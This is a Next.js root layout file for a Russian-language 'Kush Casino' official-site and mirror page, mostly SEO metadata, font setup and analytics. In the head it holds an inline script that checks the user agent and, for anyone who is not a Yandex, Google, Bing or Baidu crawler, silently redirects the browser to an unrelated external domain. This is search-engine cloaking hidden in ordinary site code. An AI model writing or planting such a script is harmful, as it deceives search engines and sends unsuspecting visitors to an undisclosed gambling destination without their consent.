import { Analytics } from '@vercel/analytics/next'
import { Geist, Playfair_Display } from 'next/font/google'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const geist = Geist({ subsets: ['latin', 'cyrillic'], variable: '--font-kc-body' })
const playfair = Playfair_Display({ subsets: ['latin', 'cyrillic'], variable: '--font-kc-display' })

export const metadata: Metadata = {
  metadataBase: new URL('https://kush11casino.vercel.app/'),
  title: 'Kush Casino — официальный сайт, зеркало и игра онлайн без лишних шагов',
  description: 'Kush Casino: официальный сайт, зеркало и понятный вход в игру онлайн. Читайте советы, выбирайте любимый формат и играйте ответственно с телефона или компьютера.',
  generator: 'Next.js',
  alternates: { canonical: 'https://kush11casino.vercel.app/' },
  icons: {
    icon: [{ url: '/kush-favicon.png', type: 'image/png' }],
    apple: '/kush-favicon.png',
  },
  robots: { index: true, follow: true },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#111713',
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className={`${geist.variable} ${playfair.variable}`}>
      <head>
        <meta name="yandex-verification" content="4a29b60726c55f5f" />
        <link rel="canonical" href="https://kush11casino.vercel.app/" />
        <meta name="keywords" content="Kush Casino, Kush Casino официальный сайт, Kush Casino зеркало, Kush Casino играть, куш казино, куш казино онлайн" />
        <meta name="theme-color" content="#111713" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://neo7-cr9t-ksh.com/dzbencl4f");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
